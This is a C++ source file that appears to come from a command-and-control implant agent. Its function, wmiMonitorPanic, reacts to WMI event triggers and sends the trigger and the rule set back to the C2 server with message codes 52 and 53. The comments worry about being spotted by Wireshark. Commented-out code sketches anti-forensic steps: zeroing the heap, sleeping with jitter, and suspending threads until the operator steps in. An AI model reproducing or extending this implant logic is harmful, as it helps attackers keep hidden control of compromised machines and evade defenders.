#include "stdafx.h"
#include "AgentPanic.h"
#include "AgentSleep.h"
#include "AgentSend.h"

bool AgentPanic::wmiMonitorPanic(json panicTrigger, json eventTrigger)
{
	/*
	Handles WMI event triggers, and follows the
	rule set.
	*/

	// TODO: add message handler to alert opperator 
	bool ReportTrigger = panicTrigger["PanicSettings"]["ReportTrigger"];
	if (ReportTrigger)
	{
		// report the trigger to C2 this may be bad if wireshark etc
		AgentSend se;
		se.sendMessage(52, "1", "String");
	}
	bool reportAlert = panicTrigger["PanicSettings"]["ReportAlert"];
	if (reportAlert)
	{
		// report the trigger rule to C2 this may be bad if wireshark etc
		AgentSend se;
		std::string temp = panicTrigger.dump();
		se.sendMessage(53, temp, "String");
	}
	//if (panicTrigger["PanicSettings"]["ZeroAgent"])
	//{
	//	// send thread call home to C2 and panic and zero all heap 
	//	if (panicTrigger["PanicSettings"]["ReportTrigger"])
	//	{
	//		// report the trigger to C2 this may be bad if wireshark etc

	//	}
	//}
	//if (panicTrigger["PanicSettings"]["ExitAgent"])
	//{
	//	/* sleep agent auto and send alert to agent C2
	//	 this will also susspend all threads and wait for recovery
	//	 from opperator
	//	*/

	//if (panicTrigger["PanicSettings"]["SleepAgent"]) 
	//{
	//	// now sleep/jitter the agent if req within settings
	//	AgentSleep s;
	//	s.sleepAgent(panicTrigger["PanicSettings"]["SleepAgent"], panicTrigger["PanicSettings"]["SleepJitter"]);
	//}
	
	return false;
}
